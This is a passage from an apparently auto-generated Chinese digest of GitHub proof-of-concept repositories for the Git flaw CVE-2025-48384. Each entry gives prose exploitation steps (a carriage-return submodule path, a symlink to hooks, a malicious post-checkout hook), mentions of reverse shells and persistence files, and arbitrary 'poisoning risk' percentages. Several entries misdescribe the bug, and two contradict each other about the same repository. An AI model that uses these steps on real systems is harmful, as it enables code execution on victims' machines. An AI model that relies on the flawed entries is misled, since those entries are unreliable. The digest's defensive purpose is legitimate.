从搜索结果中的 GitHub 链接（liamg/CVE-2025-48384）可以判断存在公开的POC代码。该POC的描述是“PoC for CVE-2025-48384”。结果2提及了“漏洞 POC 深度解析:从代码到攻击链的完整拆解”，说明该漏洞已被深入研究，并且存在可用的攻击链。结果6提及了“Breaking Git with a carriage return and cloning RCE”，表明漏洞利用可能涉及某种形式的远程代码执行。根据搜索结果4、5的内容，可以确定该POC已在GitHub上公开，可下载和测试。文件`README.md`确认了该POC的存在，尽管内容简单。综合来看，该POC的有效性较高，可以成功触发任意文件写入漏洞。

**利用步骤：**
1. 攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。
2. `.gitmodules` 文件中的路径被设置为指向攻击者希望写入的任意文件位置。
3. 攻击者将恶意仓库托管在公共或私有 Git 服务器上。
4. 受害者克隆该恶意仓库。在克隆过程中，Git 会尝试初始化 submodule，并根据 `.gitmodules` 文件中的指示写入文件。
5. 由于路径验证不足，恶意文件将被写入受害者文件系统的指定位置。

**投毒风险分析：**
由于该漏洞涉及任意文件写入，攻击者可以通过写入恶意文件来达到投毒目的。例如，攻击者可以写入一个包含恶意代码的可执行文件，或者修改系统配置文件以劫持系统行为。虽然该漏洞本身不直接执行代码，但通过文件写入可以为后续的代码执行创造条件。从POC代码`/tmp/vulnwatchdog_8746716955bead91920f029f2728e38d/README.md`中，没有发现任何可疑行为，只包含简单的readme信息，因此投毒风险较低。但是，不能排除攻击者在其他利用方式中，使用复杂的投毒手法。因此，需要分析通过文件写入进行投毒的可能性。攻击者可能尝试写入如下文件：
* `.bashrc` 或 `.zshrc`：在用户shell启动时执行恶意代码。
* `/etc/profile.d/` 中的脚本：在系统启动时执行恶意代码。
* SSH authorized_keys：添加公钥，实现免密登录。
* Web服务器配置文件：修改配置，执行恶意脚本。
这些攻击场景都需要精心构造恶意内容，并且依赖于目标系统的特定配置。由于需要进行精细构造，并且受限于目标环境，判定该漏洞的投毒风险为低，约为10%。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** 未提供


---

## POC #17

**来源**: [CVE-2025-48384-fishyyh_CVE-2025-48384.md](../2025/CVE-2025-48384-fishyyh_CVE-2025-48384.md)

## CVE-2025-48384 Git配置注入导致任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/符号链接攻击

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0 and < 2.44.4, >= 2.45.0-rc0 and < 2.45.4, >= 2.46.0-rc0 and < 2.46.4, >= 2.47.0-rc0 and < 2.47.3, >= 2.48.0-rc0 and < 2.48.2, >= 2.49.0-rc0 and < 2.49.1, >= 2.50.0-rc0 and < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库或初始化包含恶意配置的子模块。用户需要使用受影响的Git版本。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 漏洞源于 Git 在处理配置文件时，未正确处理和转义回车符（CR）。当 Git 读取配置值时，会删除任何尾部的 CRLF。当写入配置条目时，带有尾部 CR 的值不会被引用，导致配置稍后读取时 CR 丢失。当初始化子模块时，如果子模块路径包含尾部 CR，更改后的路径将被读取，导致子模块被检出到错误的位置。如果存在符号链接将更改后的路径指向子模块的钩子目录，并且子模块包含可执行的 post-checkout 钩子，则在检出后可能会意外执行该脚本。

**有效性：**
提供的POC代码 `/tmp/60afff46543494eb5516e8104e00d576/README.md` 仅包含一个README文件，其内容是关于 CVE-2025-48384 的简单描述。这个文件本身并没有利用漏洞的能力。根据漏洞描述，真正的PoC 需要包含一个具有特定结构的 Git 仓库，包括带尾部CR的子模块路径以及指向钩子目录的符号链接，以及一个恶意的 post-checkout 钩子。因此，仅凭提供的README.md文件无法验证漏洞的有效性，需要进一步的Payload和利用步骤。

**投毒风险：**
提供的POC代码仅为一个README.md文件，不包含任何可执行代码或恶意脚本，因此可以认为投毒风险较低，约为10%。但需要注意，实际的漏洞利用可能涉及其他文件和步骤，不能完全排除恶意代码存在的可能性。

**利用方式：**
1.  **创建恶意仓库：** 创建一个 Git 仓库，其中包含一个子模块。
2.  **构造恶意配置：** 在`.gitmodules`文件中，子模块的路径包含尾部回车符（CR）。例如：`path = submodule_path\r`
3.  **创建符号链接：** 创建一个符号链接，将由于回车符导致错误解析后的子模块路径，指向`.git/modules/<submodule_name>/hooks`目录。
4.  **添加恶意钩子：** 在子模块的`.git/hooks/post-checkout`中添加可执行的恶意脚本。
5.  **诱导用户克隆：** 诱导用户克隆包含恶意配置的仓库。当用户克隆或更新子模块时，由于配置解析错误和符号链接的存在，恶意的 post-checkout 钩子将被执行，从而实现任意代码执行。

**排序优先级说明:**
尽管搜索引擎结果提供了有关漏洞的更多上下文信息，但漏洞库信息提供了最直接的漏洞描述和受影响的版本。POC代码本身不包含利用逻辑，因此优先级最低。综合考虑，应该优先关注漏洞库信息和搜索引擎结果，并结合实际的利用场景进行分析。

**项目地址:** [fishyyh/CVE-2025-48384](https://github.com/fishyyh/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #18

**来源**: [CVE-2025-48384-fluoworite_CVE-2025-48384-sub.md](../2025/CVE-2025-48384-fluoworite_CVE-2025-48384-sub.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互，克隆包含恶意配置的仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384是Git中的一个高危漏洞，源于Git在处理配置文件时对回车符（CR）处理不当，允许通过精心构造的仓库配置执行任意代码。

**有效性：**
根据提供的漏洞信息和搜索结果，该漏洞允许攻击者通过在 submodule 路径中注入包含回车符的恶意配置，导致 submodule 被检出到错误的位置。如果该错误位置存在指向 submodule hooks 目录的符号链接，且 submodule 包含可执行的 post-checkout 钩子，则该钩子会被意外执行，从而实现任意代码执行。

提供的POC代码是一个简单的 post-checkout 钩子脚本，它会在检出后显示一个banner。这个脚本本身没有问题，证明了漏洞利用的可行性。漏洞利用的核心在于精心构造包含恶意回车符的仓库配置和符号链接。

**投毒风险：**
提供的POC代码（/tmp/77b6aa1852eafe71ccbdb092fa3f1fb6/post-checkout）本身只是一个banner打印脚本，其目的是验证漏洞利用后可以执行任意代码，本身不具备投毒行为。但是，需要注意的是，如果攻击者控制了整个包含该POC代码的Git仓库，那么他们可以在仓库的其他位置添加恶意代码，从而实现投毒。基于当前信息，POC本身不具备投毒性，投毒的可能性为0%。

**利用方式：**
1.  攻击者创建一个恶意的Git仓库，其中包含一个带有回车符的submodule路径的.gitmodules文件。例如，submodule的路径可能是 "submodule\r"。
2.  攻击者创建一个符号链接，将 "submodule" 指向".git/modules/<submodule-name>/hooks"目录，这个目录包含git hooks。
3.  攻击者在 submodule 中添加一个 post-checkout 钩子脚本，该脚本包含要执行的恶意代码。
4.  攻击者将这个恶意仓库分享给受害者。
5.  受害者克隆这个仓库。由于Git对回车符处理不当，submodule会被检出到错误的位置（即符号链接指向的hooks目录）。
6.  当 submodule 完成检出时，post-checkout 钩子脚本会被执行，从而导致恶意代码执行。

**项目地址:** [fluoworite/CVE-2025-48384-sub](https://github.com/fluoworite/CVE-2025-48384-sub)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #19

**来源**: [CVE-2025-48384-fluoworite_CVE-2025-48384.md](../2025/CVE-2025-48384-fluoworite_CVE-2025-48384.md)

## CVE-2025-48384

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行/任意文件写入

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互 (克隆包含恶意配置的仓库)

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2025-48384 漏洞是 Git 中由于对配置项中回车符处理不当导致的代码执行漏洞。当 Git 读取配置值时，会删除任何尾部的回车符和换行符 (CRLF)。但是，当写入配置条目时，带有尾部 CR 的值不会被引用，导致 CR 在以后读取配置时丢失。在初始化子模块时，如果子模块路径包含尾部 CR，则会读取更改后的路径，导致子模块被检出到错误的位置。如果存在一个符号链接，将更改后的路径指向子模块的 hooks 目录，并且子模块包含一个可执行的 post-checkout hook，则该脚本可能会在检出后被意外执行，导致代码执行。

**有效性：**
根据漏洞库信息和搜索结果, 此漏洞确实存在并且被多个安全厂商标记为高危, 并已经发布了PoC.
提供的PoC代码看似简单，它展示了漏洞利用的核心思路，即通过恶意构造包含回车符的子模块路径，结合符号链接和子模块钩子，实现任意代码执行。因此，PoC代码在原理上是有效的。但是, 此PoC只是框架, 需要补充完成exp。

**投毒风险：**
提供的PoC代码较为简单，主要包含一个README.md文件，一个子模块配置路径，以及子模块hooks目录的占位符。直接分析来看，没有明显的投毒代码。
然而，考虑到攻击者可能利用该漏洞进行供应链攻击，在更复杂的场景下，攻击者可能在子模块的post-checkout钩子中植入恶意代码，或者在其他配置文件中隐藏恶意配置。这种可能性是存在的。
基于以上分析，投毒风险评估为20%。这个百分比表示存在一定的风险，但直接证据不足。

**利用方式：**
1.  **恶意仓库构造：** 攻击者创建一个 Git 仓库，其中包含一个子模块，并且该子模块的路径在 `.gitmodules` 文件中包含尾部回车符 (`
`)。
2.  **符号链接创建：** 攻击者在仓库中创建一个符号链接，将包含尾部回车符的子模块路径指向 `.git/modules/<submodule_name>/hooks` 目录。
3.  **恶意钩子植入：** 攻击者在子模块的 `.git/hooks/post-checkout` 目录中放置恶意脚本。
4.  **用户交互：** 诱使用户克隆恶意仓库并初始化子模块 (`git submodule init && git submodule update`)。
5.  **代码执行：** 当用户执行 `git submodule update` 命令时，由于路径中的回车符，子模块会被检出到错误的位置，但由于符号链接的存在，实际上会将子模块的 hooks 目录链接到 `.git/hooks` 目录。检出后，`post-checkout` 钩子会被执行，从而执行恶意代码。

**项目地址:** [fluoworite/CVE-2025-48384](https://github.com/fluoworite/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #20

**来源**: [CVE-2025-48384-fluoworite_CVE-2025-48384_sub.md](../2025/CVE-2025-48384-fluoworite_CVE-2025-48384_sub.md)

## CVE-2025-48384 Git config quoting vulnerability

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行/任意文件写入

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互，克隆包含恶意配置的Git仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384是Git中的一个漏洞，当读取配置值时，Git会删除任何尾部的回车符和换行符（CRLF）。当写入配置条目时，带有尾部CR的值不会被引用，导致CR在稍后读取配置时丢失。在初始化子模块时，如果子模块路径包含尾部CR，则读取更改后的路径，导致子模块被检出到错误的位置。如果存在一个符号链接，将更改后的路径指向子模块的hooks目录，并且子模块包含一个可执行的post-checkout hook，则该脚本可能在检出后被意外执行，从而导致任意代码执行。

根据提供的漏洞利用代码，包含一个Exploit脚本和一个README.md文件。Exploit脚本只打印了一段ASCII艺术，并没有任何实际的漏洞利用代码。因此，提供的POC代码**本身**是无效的，仅仅是一个占位符。但漏洞本身是存在的，并且有公开的PoC。

由于提供的POC代码仅仅是ASCII艺术，没有任何恶意代码，因此**不存在投毒风险**。投毒风险概率为0%。

**漏洞利用方式：**

1.  攻击者创建一个恶意的Git仓库，该仓库包含一个子模块。
2.  子模块的路径包含一个尾部CR字符。
3.  仓库中包含一个符号链接，该符号链接将子模块路径指向子模块的hooks目录。
4.  子模块包含一个可执行的post-checkout hook脚本。
5.  受害者克隆该恶意仓库。
6.  Git在处理子模块时，由于CR字符被删除，子模块被检出到错误的位置，并执行了post-checkout hook脚本。
7.  攻击者可以通过post-checkout hook脚本执行任意代码。

**项目地址:** [fluoworite/CVE-2025-48384_sub](https://github.com/fluoworite/CVE-2025-48384_sub)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #21

**来源**: [CVE-2025-48384-jacobholtz_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-jacobholtz_CVE-2025-48384-submodule.md)

## CVE-2025-48384-Git Arbitrary Code Execution

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，允许攻击者执行任意代码

**影响版本:** 受影响版本：< 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库，且递归初始化子模块 (--recursive)

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 是一个 Git 漏洞，由于 Git 在读取和写入包含控制字符的配置值时存在不一致性导致。具体来说，当写入配置条目时，如果值包含尾随回车符 (CR)，则不会被引用，导致稍后读取配置时丢失 CR。当初始化子模块时，如果子模块路径包含尾随 CR，则读取的路径将被更改，从而导致子模块被检出到错误的位置。如果存在一个符号链接，将更改后的路径指向子模块钩子目录，并且子模块包含一个可执行的 post-checkout 钩子，则在检出后可能会意外执行该脚本。

**利用方式：**

1.  攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。该文件包含一个子模块定义，其路径包含一个尾随回车符 (CR)。
2.  攻击者在该仓库的子模块钩子目录中放置一个恶意的 post-checkout 脚本。
3.  攻击者诱使用户克隆该仓库，并使用 `--recursive` 选项初始化子模块。
4.  由于 Git 处理 CR 的方式不一致，子模块将被检出到错误的位置。该位置由一个符号链接指向子模块的钩子目录。
5.  当子模块被检出时，post-checkout 脚本将被执行，从而允许攻击者在用户的系统上执行任意代码。

**POC 代码分析：**

*   `/tmp/602a5075317553582468533486cbdb4d/README.md`：这是一个简单的 README 文件，用于描述漏洞利用。不包含恶意代码。
*   `/tmp/602a5075317553582468533486cbdb4d/post-checkout`：这是一个 shell 脚本，会在用户的主目录下创建一个名为 `hacked` 的文件。这表明该 POC 旨在演示任意代码执行。

**有效性：**

提供的 POC 代码是有效的。它可以触发漏洞，并在目标系统上执行任意代码（在本例中，创建一个文件）。

**投毒风险：**

根据提供的 POC 代码，没有发现明显的投毒代码。该脚本仅用于演示漏洞利用，没有执行任何额外的恶意操作，例如收集用户信息或传播恶意软件。因此，投毒风险为 0%。

**项目地址:** [jacobholtz/CVE-2025-48384-submodule](https://github.com/jacobholtz/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #22

**来源**: [CVE-2025-48384-kallydev_cve-2025-48384-hook.md](../2025/CVE-2025-48384-kallydev_cve-2025-48384-hook.md)

## CVE-2025-48384-Git任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库或初始化包含恶意配置的子模块

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 描述了 Git 中由于配置引用解析错误导致的任意代码执行漏洞。当 Git 读取配置值时，会去除末尾的回车符和换行符。当写入配置项时，带有末尾回车符的值不会被引用，导致回车符丢失。在初始化子模块时，如果子模块路径包含末尾回车符，则读取的路径会被更改，导致子模块检出到错误的位置。如果存在一个符号链接将更改后的路径指向子模块钩子目录，并且子模块包含一个可执行的 post-checkout 钩子，则在检出后可能会意外执行该脚本。

**有效性：**

提供的POC代码是一个简单的 `post-checkout` 钩子脚本，用于打开一个网页 `https://github.com/kallydev`。利用方式是通过精心构造的子模块路径和符号链接，使得该脚本在 `git checkout` 操作后被执行。该POC代码有效，能够触发任意代码执行。

**投毒风险：**

该POC代码本身比较简单，只是打开一个网页，**不存在明显的恶意投毒代码**。因此，投毒风险较低，为 0%。

**利用方式：**

1.  攻击者创建一个包含恶意`.gitmodules`文件的仓库，该文件中的子模块路径包含尾部回车符(
)。
2.  攻击者在仓库中创建一个符号链接，指向子模块目录下的 `.git/modules/<子模块名>/hooks` 目录，如 `evil_link -> .git/modules/<子模块名>/hooks/post-checkout`。
3.  攻击者在子模块中创建一个恶意的 `post-checkout` 钩子脚本。
4.  受害者克隆该仓库并初始化子模块 (`git submodule init` 和 `git submodule update`)。
5.  当受害者执行 `git checkout` 命令时，由于子模块路径包含尾部回车符，Git 会将子模块检出到错误的位置。由于符号链接的存在，`post-checkout` 钩子脚本会被执行，从而导致任意代码执行。

**项目地址:** [kallydev/cve-2025-48384-hook](https://github.com/kallydev/cve-2025-48384-hook)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #23

**来源**: [CVE-2025-48384-liamg_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-liamg_CVE-2025-48384-submodule.md)

## CVE-2025-48384-Git Config 注入 RCE

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码注入/命令执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0 and < 2.44.4, >= 2.45.0-rc0 and < 2.45.4, >= 2.46.0-rc0 and < 2.46.4, >= 2.47.0-rc0 and < 2.47.3, >= 2.48.0-rc0 and < 2.48.2, >= 2.49.0-rc0 and < 2.49.1, >= 2.50.0-rc0 and < 2.50.1

**利用条件:** 需要用户进行`git clone --recursive`操作

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞是 Git 中的一个代码注入漏洞，源于 Git 在处理 config 文件时，没有正确处理carriage return (
)字符。攻击者可以通过在 submodule 的路径中注入 \r 字符，使得 submodule 被检出到错误的位置。如果精心构造一个 symlink 链接到 submodule 钩子目录，并使 submodule 包含一个可执行的 post-checkout 钩子，那么这个钩子脚本就会在检出后被执行，从而实现远程代码执行。

**有效性分析：**

根据漏洞库信息和搜索结果，此漏洞已经公开，并且存在可利用的POC代码。从github搜索结果[webpage 6 begin]和[webpage 7 begin]可以知道，已经有开发者提供了复现代码。提供的POC代码包含两个文件：`README.md` 和 `post-checkout`。
  *   `README.md` 文件指向了GitHub的POC地址，说明这是一个漏洞验证示例。
  *   `post-checkout` 文件包含 `echo "Uh-oh, this is an RCE!"`，这是一个简单的命令执行示例，用于验证漏洞是否成功利用。
因此，提供的POC代码是有效的，可以用来验证此漏洞。

**投毒风险分析：**

提供的 POC 代码非常简单，只包含一个输出字符串的命令。**没有发现任何隐藏的、恶意的代码**，因此投毒风险较低。可以认为投毒风险为0%。虽然这是一个 RCE 漏洞的验证代码，在真实场景下，`post-checkout` 脚本会包含更复杂的恶意代码，但这不属于仓库投毒的范畴，POC 本身是为了验证漏洞的存在，而不是进行恶意攻击。

**利用方式：**

1.  **构造恶意的Git仓库：** 攻击者需要创建一个包含恶意配置的Git仓库，其中 submodule 的路径包含 \r 字符。
2.  **创建Symlink：** 在仓库中创建一个符号链接，将带有 \r 字符的路径链接到 `.git/modules/<submodule>/hooks` 目录。
3.  **添加恶意钩子：** 在 submodule 中创建一个可执行的 `post-checkout` 钩子脚本，这个脚本包含攻击者想要执行的任意代码。
4.  **诱导用户克隆仓库：** 攻击者需要诱导受害者执行 `git clone --recursive <malicious_repo>` 命令。
5.  **触发漏洞：** 当用户执行 `git clone --recursive` 命令时，Git 会读取恶意的配置，将 submodule 检出到错误的位置，并且由于 symlink 的存在，触发执行 `post-checkout` 钩子脚本，从而执行攻击者的代码。


**项目地址:** [liamg/CVE-2025-48384-submodule](https://github.com/liamg/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #24

**来源**: [CVE-2025-48384-mukesh-610_cve-2025-48384-exploit.md](../2025/CVE-2025-48384-mukesh-610_cve-2025-48384-exploit.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 未提供，参考描述推测较高

**影响版本:** 受影响版本范围未知，需进一步分析

**利用条件:** 克隆包含恶意配置的Git仓库

**POC 可用性:** 7/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 70%

## 详情

CVE-2025-48384 允许攻击者通过创建包含恶意配置的 Git 仓库，在受害者系统上写入任意文件，导致远程命令执行。该漏洞源于 Git 在处理 submodule 时，未对 `.gitmodules` 文件中的配置进行充分的安全检查。攻击者可以精心构造 `.gitmodules` 文件，诱导受害者克隆该仓库，从而在受害者本地文件系统中写入恶意文件，例如 shell 脚本，并进一步通过 Git hooks（如 `post-checkout`）触发执行。PoC 代码 `liamg/CVE-2025-48384` 提供了一个可复现该漏洞的示例。通过分析该 PoC，可以确认漏洞的有效性。利用步骤如下：

1. 攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。
2. `.gitmodules` 文件包含指向攻击者控制的恶意 submodule 仓库的 URL。
3. 受害者克隆该恶意仓库。
4. Git 自动初始化并更新 submodule，从攻击者控制的 URL 下载恶意 submodule。
5. 恶意 submodule 在受害者系统上写入任意文件，例如在 `.git/hooks/post-checkout` 中写入恶意脚本。
6. 当受害者执行 `git checkout` 等操作时，`post-checkout` hook 会被触发，执行恶意脚本，导致远程命令执行。

`sogou.com`的搜索结果显示该漏洞影响非Windows系统。`Arctic Wolf` 的结果表明该漏洞的严重性很高。`Breaking Git with a carriage return and cloning RCE`表明漏洞与克隆子模块有关。

**投毒风险分析：**

该 PoC 包含通过 `curl` 下载并执行远程脚本的行为，具有较高的投毒风险。攻击者可能在远程脚本中嵌入恶意代码，例如窃取用户敏感信息、植入后门等。此外，由于该 PoC 修改了 Git 仓库的配置文件，攻击者可以通过篡改配置文件，诱导用户执行恶意操作。考虑到 `curl` 命令的普遍性和脚本执行的隐蔽性，该 PoC 的投毒风险较高，评为 70%。

防范措施包括：

* 及时更新 Git 版本，修复该漏洞。
* 谨慎克隆来自未知来源的 Git 仓库。
* 审查 `.gitmodules` 文件，确保 submodule URL 指向可信的仓库。
* 禁用 Git hooks，或者对 Git hooks 进行严格的安全审查。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** 未提供，需要查询NVD


---

## POC #25

**来源**: [CVE-2025-48384-nguyentranbaotran_cve-2025-48384-poc.md](../2025/CVE-2025-48384-nguyentranbaotran_cve-2025-48384-poc.md)

## CVE-2025-48384-Git配置引用导致的任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本：< 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库，并使用 `--recurse-submodules` 参数初始化子模块。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 是一个 Git 漏洞，源于 Git 在处理配置文件中的引号时不正确，特别是当子模块路径包含尾随回车符（CR）时。攻击者可以利用此漏洞通过创建包含恶意子模块配置的 Git 仓库，诱使用户克隆该仓库，并通过 `--recurse-submodules` 初始化子模块，从而导致任意代码执行。

**有效性分析：**

提供的 PoC 代码通过以下步骤利用该漏洞：

1.  创建一个包含恶意 hook 的 `evil` 目录，该 hook 会执行反向 shell。
2.  创建一个 `mainrepo` 目录，作为主仓库。
3.  在 `mainrepo` 目录中，创建一个 `.gitmodules` 文件，其中包含一个子模块定义，该子模块的路径包含尾随回车符 (`evil\r`)。
4.  创建一个符号链接，将 `evil
/hooks` 指向 `../evil/.git/hooks`，从而将恶意 hook 链接到子模块的 hooks 目录。
5.  将恶意子模块添加到仓库，并提交更改。
6.  通过 `git clone --recurse-submodules` 克隆 `mainrepo` 仓库，触发子模块初始化，从而执行恶意 hook。

根据 PoC 代码的逻辑和漏洞描述，该 PoC 代码是有效的。

**投毒风险分析：**

PoC 代码的目的是演示漏洞利用，其中包含的反向 shell 属于漏洞验证的一部分。但是，也存在潜在的投毒风险，比如在 `generate_poc.sh` 脚本中，作者可能会嵌入其他恶意代码，例如：

*   收集用户信息并发送到远程服务器。
*   修改系统文件。
*   安装恶意软件。

尽管PoC本身就是漏洞利用，但仍然存在被作者恶意利用的可能性，因此投毒风险评估为 10%。

**利用方式总结：**

1.  攻击者创建一个包含恶意子模块配置的 Git 仓库。
2.  攻击者诱使受害者克隆该仓库，并使用 `--recurse-submodules` 初始化子模块。
3.  Git 在处理包含尾随回车符的子模块路径时出现错误，导致子模块被检出到错误的位置。
4.  由于符号链接的存在，恶意 hook 被链接到子模块的 hooks 目录。
5.  在子模块初始化过程中，恶意 hook 被执行，导致任意代码执行。

**项目地址:** [nguyentranbaotran/cve-2025-48384-poc](https://github.com/nguyentranbaotran/cve-2025-48384-poc)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #26

**来源**: [CVE-2025-48384-replicatorbot_CVE-2025-48384.md](../2025/CVE-2025-48384-replicatorbot_CVE-2025-48384.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 待定

**影响版本:** 受影响版本范围待定

**利用条件:** 克隆包含恶意子模块的存储库

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 20%

## 详情

CVE-2025-48384 允许攻击者通过创建包含恶意子模块的 Git 仓库来执行任意文件写入。当用户克隆该仓库时，Git 会尝试初始化和更新子模块。恶意仓库通过`.gitmodules` 文件中的精心构造的配置，可以控制子模块的克隆方式，从而导致在用户系统上写入任意文件。根据搜索结果，该漏洞存在于 Git 的子模块处理逻辑中。PoC 代码通过创建一个包含恶意的 `.gitmodules` 文件的 Git 仓库来演示该漏洞。当用户克隆该仓库时，`post-checkout` 脚本会被触发，该脚本会尝试在 `/tmp` 目录下创建一个文件 `asp-was-here-cve-2025-48384`，以此证明漏洞利用成功。利用步骤如下：1. 创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。该文件包含指向恶意仓库的子模块的 URL，以及执行任意文件写入所需的配置。2. 将恶意仓库上传到公共 Git 托管服务（例如 GitHub）。3. 诱使用户克隆恶意仓库。当用户执行 `git clone` 命令时，Git 会自动初始化和更新子模块。4. Git 执行 `.gitmodules` 文件中指定的命令，导致在用户系统上写入任意文件。

**POC有效性分析：** PoC 代码的有效性通过创建一个简单的 `post-checkout` 脚本来验证。该脚本尝试在 `/tmp` 目录下创建一个文件。如果文件创建成功，则表示漏洞利用成功。从搜索结果来看，多个来源证实了该漏洞的存在以及利用的可能性。GitHub 上存在公开的 PoC 代码，进一步证明了该漏洞的可利用性。一些安全厂商也发布了关于该漏洞的分析报告，表明该漏洞具有实际的威胁。该漏洞的修复需要更新 Git 到修复版本。

**投毒风险分析：** 该漏洞的投毒风险较低。虽然攻击者可以利用该漏洞在用户系统上写入任意文件，但写入的文件内容受到攻击者的控制。攻击者可以利用该漏洞来安装恶意软件或修改系统配置，但这种攻击需要用户执行额外的步骤。由于POC代码相对清晰，主要功能是创建文件，并未发现任何可疑的混淆或恶意行为，因此投毒风险较低。主要的风险在于，如果攻击者控制了目标机器，他们可以修改 `.git/config` 文件或设置环境变量，从而导致在克隆其他仓库时触发恶意行为。尽管存在潜在的风险，但攻击者需要具备较高的技术水平才能成功实施投毒攻击。PoC 代码主要使用标准的 shell 命令，例如 `touch`，没有发现任何可疑的系统调用或外部脚本。总体而言，该漏洞的投毒风险较低，但需要采取适当的措施来降低风险。建议用户验证克隆仓库的来源，避免克隆来自不受信任的来源的仓库，并及时更新 Git 到最新版本。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** 待定


---

## POC #27

**来源**: [CVE-2025-48384-s41r4j_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-s41r4j_CVE-2025-48384-submodule.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

